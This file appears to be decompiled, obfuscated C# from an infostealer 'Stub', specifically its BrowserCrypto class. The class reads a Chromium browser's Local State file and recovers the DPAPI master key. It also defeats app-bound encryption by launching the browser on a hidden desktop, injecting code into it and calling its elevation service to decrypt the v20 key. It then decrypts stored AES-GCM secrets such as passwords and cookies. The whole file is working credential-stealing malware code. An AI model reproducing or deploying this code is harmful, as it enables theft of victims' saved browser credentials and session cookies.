using System;
using System.IO;
using System.Linq.Expressions;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using dg3ypDAonQcOidMs0w;
using Microsoft.CSharp.RuntimeBinder;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000010 RID: 16
	public class BrowserCrypto
	{
		// Token: 0x06000045 RID: 69 RVA: 0x000072C8 File Offset: 0x000054C8
		public BrowserCrypto(string UserDataPath, string[] possibleLibraryPaths)
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			this.InjectionDesktopName = "InjectionDesktop" + Utils.GenerateRandomString(8);
			this.operational = false;
			base..ctor();
			if (!UserDataPath.EndsWith("Local State"))
			{
				UserDataPath = Path.Combine(UserDataPath, "Local State");
			}
			this.masterKey = BrowserCrypto.GetMasterKey(UserDataPath);
			this.operational = this.masterKey != null;
			if (this.operational && possibleLibraryPaths != null)
			{
				foreach (string text in possibleLibraryPaths)
				{
					this.appBoundPrivateKey = this.GetAppBoundKey(UserDataPath, text);
					if (this.appBoundPrivateKey != null)
					{
						break;
					}
				}
			}
		}

		// Token: 0x06000046 RID: 70 RVA: 0x0000737C File Offset: 0x0000557C
		private byte[] GetAppBoundKey(string localState, string LibraryPath)
		{
			uint num = 4096U;
			uint num2 = 8192U;
			uint num3 = 4U;
			uint num4 = 32768U;
			byte[] array;
			if (!File.Exists(localState))
			{
				array = null;
			}
			else
			{
				string text = Utils.ForceReadFileString(localState, false);
				if (text == null)
				{
					array = null;
				}
				else if (!text.Contains("os_crypt"))
				{
					array = null;
				}
				else
				{
					JavaScriptSerializer javaScriptSerializer = new JavaScriptSerializer();
					try
					{
						object obj = javaScriptSerializer.Deserialize<object>(text);
						if (BrowserCrypto.<>o__5.<>p__1 == null)
						{
							BrowserCrypto.<>o__5.<>p__1 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(BrowserCrypto), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, bool> target = BrowserCrypto.<>o__5.<>p__1.Target;
						CallSite <>p__ = BrowserCrypto.<>o__5.<>p__1;
						if (BrowserCrypto.<>o__5.<>p__0 == null)
						{
							BrowserCrypto.<>o__5.<>p__0 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(BrowserCrypto), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						if (target(<>p__, BrowserCrypto.<>o__5.<>p__0.Target(BrowserCrypto.<>o__5.<>p__0, obj, null)))
						{
							if (BrowserCrypto.<>o__5.<>p__4 == null)
							{
								BrowserCrypto.<>o__5.<>p__4 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(BrowserCrypto)));
							}
							Func<CallSite, object, string> target2 = BrowserCrypto.<>o__5.<>p__4.Target;
							CallSite <>p__2 = BrowserCrypto.<>o__5.<>p__4;
							object obj2 = obj;
							object obj3;
							if (obj2 == null)
							{
								obj3 = null;
							}
							else
							{
								if (BrowserCrypto.<>o__5.<>p__2 == null)
								{
									BrowserCrypto.<>o__5.<>p__2 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(BrowserCrypto), new CSharpArgumentInfo[]
									{
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
									}));
								}
								object obj4 = BrowserCrypto.<>o__5.<>p__2.Target(BrowserCrypto.<>o__5.<>p__2, obj2, "os_crypt");
								if (obj4 == null)
								{
									obj3 = null;
								}
								else
								{
									if (BrowserCrypto.<>o__5.<>p__3 == null)
									{
										BrowserCrypto.<>o__5.<>p__3 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(BrowserCrypto), new CSharpArgumentInfo[]
										{
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
										}));
									}
									obj3 = BrowserCrypto.<>o__5.<>p__3.Target(BrowserCrypto.<>o__5.<>p__3, obj4, "app_bound_encrypted_key");
								}
							}
							string text2 = target2(<>p__2, obj3);
							if (text2 == null)
							{
								return null;
							}
							byte[] array2 = Convert.FromBase64String(text2);
							if (Encoding.UTF8.GetString(array2, 0, 4) != "APPB")
							{
								return null;
							}
							byte[] array3 = new byte[array2.Length - 4];
							Buffer.BlockCopy(array2, 4, array3, 0, array3.Length);
							IntPtr intPtr = NativeMethods.OpenDesktopW(this.InjectionDesktopName, 0U, false, InternalStructs.DESKTOP_ACCESS.GENERIC_ALL);
							if (intPtr == IntPtr.Zero)
							{
								intPtr = NativeMethods.CreateDesktopW(this.InjectionDesktopName, null, IntPtr.Zero, 0U, InternalStructs.DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
							}
							if (intPtr == IntPtr.Zero)
							{
								return null;
							}
							string temporaryDirectory = Utils.GetTemporaryDirectory();
							string text3 = string.Concat(new string[] { "\"", LibraryPath, "\" --no-sandbox --allow-no-sandbox-job --disable-gpu --mute-audio --disable-audio --user-data-dir=\"", temporaryDirectory, "\"" });
							foreach (int num5 in Utils.GetAllProcessOnDesktop(this.InjectionDesktopName))
							{
								Utils.KillProcess(num5, 0U);
							}
							int num6;
							if (!Utils.StartProcessInDesktop(this.InjectionDesktopName, text3, out num6))
							{
								NativeMethods.CloseDesktop(intPtr);
								return null;
							}
							Thread.Sleep(300);
							int[] array4 = Utils.GetAllProcessOnDesktop(this.InjectionDesktopName);
							if (array4.Length == 0)
							{
								NativeMethods.CloseDesktop(intPtr);
								return null;
							}
							byte[] array5 = new byte[12 + array3.Length + 4];
							IntPtr intPtr2 = NativeMethods.VirtualAlloc(IntPtr.Zero, (UIntPtr)1024UL, num | num2, num3);
							Buffer.BlockCopy(BitConverter.GetBytes(intPtr2.ToInt64()), 0, array5, 0, 8);
							Buffer.BlockCopy(BitConverter.GetBytes(NativeMethods.GetCurrentProcessId()), 0, array5, 8, 4);
							Buffer.BlockCopy(array3, 0, array5, 12, array3.Length);
							Buffer.BlockCopy(BitConverter.GetBytes(12 + array3.Length), 0, array5, 12 + array3.Length, 4);
							bool flag = false;
							int num7 = 5;
							int num8 = 0;
							for (;;)
							{
								IL_0462:
								int[] array6 = array4;
								int j = 0;
								while (j < array6.Length)
								{
									int num9 = array6[j];
									if (SharpInjector.Inject(num9, new Action(BrowserCrypto.InjectionEntryPointDONOTCALL), 2000U, array5) != SharpInjector.InjectionStatusCode.SUCCESS)
									{
										j++;
									}
									else
									{
										flag = true;
										IL_043A:
										if (num8 < num7 && !flag)
										{
											Thread.Sleep(100);
											array4 = Utils.GetAllProcessOnDesktop(this.InjectionDesktopName);
											num8++;
											goto IL_0462;
										}
										goto IL_046B;
									}
								}
								goto IL_043A;
							}
							IL_046B:
							if (!flag)
							{
								foreach (int num10 in Utils.GetAllProcessOnDesktop(this.InjectionDesktopName))
								{
									Utils.KillProcess(num10, 0U);
								}
								NativeMethods.VirtualFree(intPtr2, UIntPtr.Zero, num4);
								NativeMethods.CloseDesktop(intPtr);
								return null;
							}
							byte[] array7 = null;
							for (int l = 0; l < 200; l++)
							{
								if (Marshal.ReadByte(intPtr2) > 0)
								{
									int num11 = Marshal.ReadInt32(intPtr2 + 1);
									if (num11 != 0)
									{
										array7 = new byte[num11];
										Marshal.Copy(intPtr2 + 4 + 1, array7, 0, num11);
									}
									IL_0525:
									NativeMethods.VirtualFree(intPtr2, UIntPtr.Zero, num4);
									foreach (int num12 in Utils.GetAllProcessOnDesktop(this.InjectionDesktopName))
									{
										Utils.KillProcess(num12, 0U);
									}
									NativeMethods.CloseDesktop(intPtr);
									try
									{
										Directory.Delete(temporaryDirectory, true);
									}
									catch
									{
									}
									return array7;
								}
								Thread.Sleep(10);
							}
							goto IL_0525;
						}
					}
					catch
					{
					}
					array = null;
				}
			}
			return array;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00007948 File Offset: 0x00005B48
		public static void InjectionEntryPointDONOTCALL()
		{
			byte[] currentSelfBytes = Utils.GetCurrentSelfBytes();
			int num = BitConverter.ToInt32(currentSelfBytes, currentSelfBytes.Length - 4);
			long num2 = BitConverter.ToInt64(currentSelfBytes, currentSelfBytes.Length - 4 - num);
			int num3 = BitConverter.ToInt32(currentSelfBytes, currentSelfBytes.Length - 4 - num + 8);
			byte[] array = new byte[num - 4 - 8];
			Buffer.BlockCopy(currentSelfBytes, currentSelfBytes.Length - 4 - num + 8 + 4, array, 0, array.Length);
			byte[] array2 = BrowserCrypto.DecryptKey(array);
			if (array2 == null)
			{
				array2 = new byte[0];
			}
			byte[] array3 = new byte[5 + array2.Length];
			Buffer.BlockCopy(new byte[] { 1 }, 0, array3, 0, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(array2.Length), 0, array3, 1, 4);
			Buffer.BlockCopy(array2, 0, array3, 5, array2.Length);
			IntPtr processHandleWithRequiredRights = SharpInjector.GetProcessHandleWithRequiredRights(num3);
			if (Utils.IsProcess64Bit(processHandleWithRequiredRights))
			{
				Utils64.WriteBytesToProcess64(processHandleWithRequiredRights, (ulong)num2, array3);
			}
			else
			{
				Utils32.WriteBytesToProcess32(processHandleWithRequiredRights, (IntPtr)num2, array3);
			}
			NativeMethods.CloseHandle(processHandleWithRequiredRights);
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00007A3C File Offset: 0x00005C3C
		private static byte[] DecryptKey(byte[] key)
		{
			uint maxValue = uint.MaxValue;
			uint maxValue2 = uint.MaxValue;
			uint num = 6U;
			uint num2 = 3U;
			uint num3 = 64U;
			Guid guid = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
			Guid guid2 = typeof(InternalStructs.IElevator).GUID;
			IntPtr intPtr;
			int num4 = NativeMethods.CoCreateInstance(ref guid, IntPtr.Zero, 4U, ref guid2, out intPtr);
			byte[] array;
			if (num4 < 0)
			{
				array = null;
			}
			else
			{
				InternalStructs.IElevator elevator = (InternalStructs.IElevator)Marshal.GetObjectForIUnknown(intPtr);
				num4 = NativeMethods.CoSetProxyBlanket(intPtr, maxValue, maxValue2, IntPtr.Zero, num, num2, IntPtr.Zero, num3);
				if (num4 < 0)
				{
					array = null;
				}
				else
				{
					IntPtr intPtr2 = NativeMethods.SysAllocStringByteLen(key, (uint)key.Length);
					if (intPtr2 == IntPtr.Zero)
					{
						array = null;
					}
					else
					{
						Marshal.Copy(key, 0, intPtr2, key.Length);
						IntPtr intPtr3;
						try
						{
							uint num5;
							num4 = elevator.DecryptData(intPtr2, out intPtr3, out num5);
						}
						catch
						{
							return null;
						}
						finally
						{
							Marshal.FreeBSTR(intPtr2);
						}
						if (num4 < 0)
						{
							array = null;
						}
						else
						{
							int num6 = Marshal.SystemMaxDBCSCharSize * (int)NativeMethods.SysStringByteLen(intPtr3);
							byte[] array2 = new byte[num6];
							Marshal.Copy(intPtr3, array2, 0, num6);
							Marshal.FreeBSTR(intPtr3);
							array = array2;
						}
					}
				}
			}
			return array;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00007B78 File Offset: 0x00005D78
		private static byte[] GetMasterKey(string path)
		{
			byte[] array;
			if (!File.Exists(path))
			{
				array = null;
			}
			else
			{
				string text = Utils.ForceReadFileString(path, false);
				if (text == null)
				{
					array = null;
				}
				else if (!text.Contains("os_crypt"))
				{
					array = null;
				}
				else
				{
					JavaScriptSerializer javaScriptSerializer = new JavaScriptSerializer();
					try
					{
						object obj = javaScriptSerializer.Deserialize<object>(text);
						if (BrowserCrypto.<>o__8.<>p__1 == null)
						{
							BrowserCrypto.<>o__8.<>p__1 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(BrowserCrypto), new CSharpArgumentInfo[] { CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null) }));
						}
						Func<CallSite, object, bool> target = BrowserCrypto.<>o__8.<>p__1.Target;
						CallSite <>p__ = BrowserCrypto.<>o__8.<>p__1;
						if (BrowserCrypto.<>o__8.<>p__0 == null)
						{
							BrowserCrypto.<>o__8.<>p__0 = CallSite<Func<CallSite, object, object, object>>.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(BrowserCrypto), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
							}));
						}
						if (target(<>p__, BrowserCrypto.<>o__8.<>p__0.Target(BrowserCrypto.<>o__8.<>p__0, obj, null)))
						{
							if (BrowserCrypto.<>o__8.<>p__4 == null)
							{
								BrowserCrypto.<>o__8.<>p__4 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(string), typeof(BrowserCrypto)));
							}
							Func<CallSite, object, string> target2 = BrowserCrypto.<>o__8.<>p__4.Target;
							CallSite <>p__2 = BrowserCrypto.<>o__8.<>p__4;
							object obj2 = obj;
							object obj3;
							if (obj2 == null)
							{
								obj3 = null;
							}
							else
							{
								if (BrowserCrypto.<>o__8.<>p__2 == null)
								{
									BrowserCrypto.<>o__8.<>p__2 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(BrowserCrypto), new CSharpArgumentInfo[]
									{
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
										CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
									}));
								}
								object obj4 = BrowserCrypto.<>o__8.<>p__2.Target(BrowserCrypto.<>o__8.<>p__2, obj2, "os_crypt");
								if (obj4 == null)
								{
									obj3 = null;
								}
								else
								{
									if (BrowserCrypto.<>o__8.<>p__3 == null)
									{
										BrowserCrypto.<>o__8.<>p__3 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof(BrowserCrypto), new CSharpArgumentInfo[]
										{
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
											CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
										}));
									}
									obj3 = BrowserCrypto.<>o__8.<>p__3.Target(BrowserCrypto.<>o__8.<>p__3, obj4, "encrypted_key");
								}
							}
							string text2 = target2(<>p__2, obj3);
							if (text2 == null)
							{
								return null;
							}
							byte[] array2 = Convert.FromBase64String(text2);
							if (Encoding.UTF8.GetString(array2, 0, 5) != "DPAPI")
							{
								return null;
							}
							byte[] array3 = new byte[array2.Length - 5];
							Buffer.BlockCopy(array2, 5, array3, 0, array3.Length);
							return ProtectedData.Unprotect(array3, null, DataProtectionScope.CurrentUser);
						}
					}
					catch
					{
					}
					array = null;
				}
			}
			return array;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00007DF4 File Offset: 0x00005FF4
		public string DecryptBase64(string buffer)
		{
			string text;
			try
			{
				text = this.Decrypt(Convert.FromBase64String(buffer));
			}
			catch
			{
				text = null;
			}
			return text;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00007E28 File Offset: 0x00006028
		public string Decrypt(byte[] buffer)
		{
			string text;
			if (!this.operational)
			{
				text = null;
			}
			else
			{
				try
				{
					byte[] array = null;
					byte[] array2 = new byte[3];
					Array.Copy(buffer, 0, array2, 0, 3);
					string @string = Encoding.UTF8.GetString(array2);
					if (@string == "v10" || @string == "v11")
					{
						array = this.masterKey;
					}
					else if (@string == "v20")
					{
						array = this.appBoundPrivateKey;
					}
					if (array == null)
					{
						text = null;
					}
					else
					{
						byte[] array3 = new byte[12];
						Array.Copy(buffer, 3, array3, 0, 12);
						int num = buffer.Length - 15;
						byte[] array4 = new byte[num];
						Array.Copy(buffer, 15, array4, 0, num);
						byte[] array5 = new byte[16];
						byte[] array6 = new byte[num - 16];
						Array.Copy(array4, num - 16, array5, 0, 16);
						Array.Copy(array4, 0, array6, 0, num - 16);
						string string2 = Encoding.UTF8.GetString(AesGcm.Decrypt(array, array3, null, array6, array5));
						text = string2;
					}
				}
				catch
				{
					text = null;
				}
			}
			return text;
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000038AD File Offset: 0x00001AAD
		static BrowserCrypto()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}

		// Token: 0x0400003B RID: 59
		private string InjectionDesktopName;

		// Token: 0x0400003C RID: 60
		private byte[] masterKey;

		// Token: 0x0400003D RID: 61
		private byte[] appBoundPrivateKey;

		// Token: 0x0400003E RID: 62
		public bool operational;
	}
}
